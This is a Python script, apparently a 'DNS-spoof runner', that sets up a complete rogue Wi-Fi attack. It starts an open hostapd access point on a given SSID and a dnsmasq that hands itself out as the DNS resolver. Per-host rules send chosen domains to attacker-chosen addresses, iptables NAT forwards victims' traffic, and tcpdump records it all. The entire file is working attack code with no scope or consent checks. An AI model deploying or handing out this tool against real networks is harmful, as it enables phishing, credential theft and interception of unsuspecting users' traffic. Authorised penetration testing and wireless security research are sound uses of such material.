"""DNS-spoof runner.

Brings up an open hostapd on AP_IFACE, a dnsmasq whose DHCP hands out
itself as resolver, and an --address flag per rule in RULES_FILE. Also
starts tcpdump on AP_IFACE for evidence.
"""

from __future__ import annotations

import argparse
import shutil
import signal
import subprocess
import sys
import time
from pathlib import Path


def hostapd_conf(iface: str, ssid: str, channel: int) -> str:
    return (
        f"interface={iface}\n"
        "driver=nl80211\n"
        f"ssid={ssid}\n"
        "hw_mode=g\n"
        f"channel={channel}\n"
        "ieee80211n=1\n"
        "auth_algs=1\n"
        "wmm_enabled=1\n"
    )


def parse_rules(rules_path: Path) -> list[tuple[str, str]]:
    pairs: list[tuple[str, str]] = []
    for raw in rules_path.read_text().splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split()
        if len(parts) != 2:
            continue
        pairs.append((parts[0], parts[1]))
    return pairs


def dnsmasq_conf(iface: str, log_path: Path, rules: list[tuple[str, str]]) -> str:
    body = [
        f"interface={iface}",
        "bind-interfaces",
        "dhcp-range=10.0.0.10,10.0.0.100,12h",
        "dhcp-option=3,10.0.0.1",
        "dhcp-option=6,10.0.0.1",
        "log-queries",
        f"log-facility={log_path}",
    ]
    for host, ip in rules:
        body.append(f"address=/{host}/{ip}")
    return "\n".join(body) + "\n"


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--workdir", required=True)
    p.add_argument("--ap-iface", required=True)
    p.add_argument("--ssid", required=True)
    p.add_argument("--channel", type=int, required=True)
    p.add_argument("--rules", required=True)
    p.add_argument("--upstream", default="eth0")
    args = p.parse_args()

    workdir = Path(args.workdir)
    workdir.mkdir(parents=True, exist_ok=True)
    hostapd_path = workdir / "hostapd.conf"
    dnsmasq_path = workdir / "dnsmasq.conf"
    hostapd_log = workdir / "hostapd.log"
    dnsmasq_log = workdir / "dnsmasq.log"
    pcap = workdir / "capture.pcap"
    rules_copy = workdir / "rules.txt"

    rules_src = Path(args.rules)
    if not rules_src.is_file():
        print(f"[x] rules file not found: {rules_src}", flush=True)
        return 2
    shutil.copyfile(rules_src, rules_copy)
    rules = parse_rules(rules_copy)

    hostapd_path.write_text(hostapd_conf(args.ap_iface, args.ssid, args.channel))
    dnsmasq_path.write_text(dnsmasq_conf(args.ap_iface, dnsmasq_log, rules))

    subprocess.run(["nmcli", "device", "set", args.ap_iface, "managed", "no"], check=False)
    subprocess.run(["ip", "addr", "flush", "dev", args.ap_iface], check=False)
    subprocess.run(["ip", "addr", "add", "10.0.0.1/24", "dev", args.ap_iface], check=False)
    subprocess.run(["ip", "link", "set", args.ap_iface, "up"], check=False)

    nat_ok = Path(f"/sys/class/net/{args.upstream}").exists()
    if nat_ok:
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"],
                       stdout=subprocess.DEVNULL, check=False)
        subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING",
                        "-o", args.upstream, "-j", "MASQUERADE"], check=False)
        subprocess.run(["iptables", "-A", "FORWARD", "-i", args.ap_iface,
                        "-o", args.upstream, "-j", "ACCEPT"], check=False)
        subprocess.run(["iptables", "-A", "FORWARD", "-i", args.upstream, "-o", args.ap_iface,
                        "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"],
                       check=False)

    hostapd_fh = open(hostapd_log, "ab")
    dnsmasq_fh = open(dnsmasq_log, "ab")
    hostapd = subprocess.Popen(["hostapd", str(hostapd_path)],
                               stdout=hostapd_fh, stderr=hostapd_fh)
    dnsmasq = subprocess.Popen(["dnsmasq", "--no-daemon", "-C", str(dnsmasq_path)],
                               stdout=dnsmasq_fh, stderr=dnsmasq_fh)
    tcpdump = subprocess.Popen(
        ["tcpdump", "-i", args.ap_iface, "-n", "-s0", "-w", str(pcap)],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )

    running = {"go": True}

    def stop(_sig, _frm):
        running["go"] = False

    signal.signal(signal.SIGTERM, stop)
    signal.signal(signal.SIGINT, stop)

    print(f"[*] dns-spoof up: SSID={args.ssid!r} ch={args.channel} "
          f"rules={len(rules)}", flush=True)

    try:
        while running["go"]:
            if hostapd.poll() is not None:
                print("[x] hostapd died", flush=True)
                break
            time.sleep(1)
    finally:
        for proc in (hostapd, dnsmasq, tcpdump):
            try:
                proc.terminate()
            except Exception:
                pass
        for proc in (hostapd, dnsmasq, tcpdump):
            try:
                proc.wait(timeout=3)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        hostapd_fh.close()
        dnsmasq_fh.close()
        if nat_ok:
            subprocess.run(["iptables", "-t", "nat", "-D", "POSTROUTING",
                            "-o", args.upstream, "-j", "MASQUERADE"], check=False)
            subprocess.run(["iptables", "-D", "FORWARD", "-i", args.ap_iface,
                            "-o", args.upstream, "-j", "ACCEPT"], check=False)
            subprocess.run(["iptables", "-D", "FORWARD", "-i", args.upstream, "-o", args.ap_iface,
                            "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"],
                           check=False)
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"],
                           stdout=subprocess.DEVNULL, check=False)
        subprocess.run(["ip", "addr", "flush", "dev", args.ap_iface], check=False)
    return 0


if __name__ == "__main__":
    sys.exit(main())
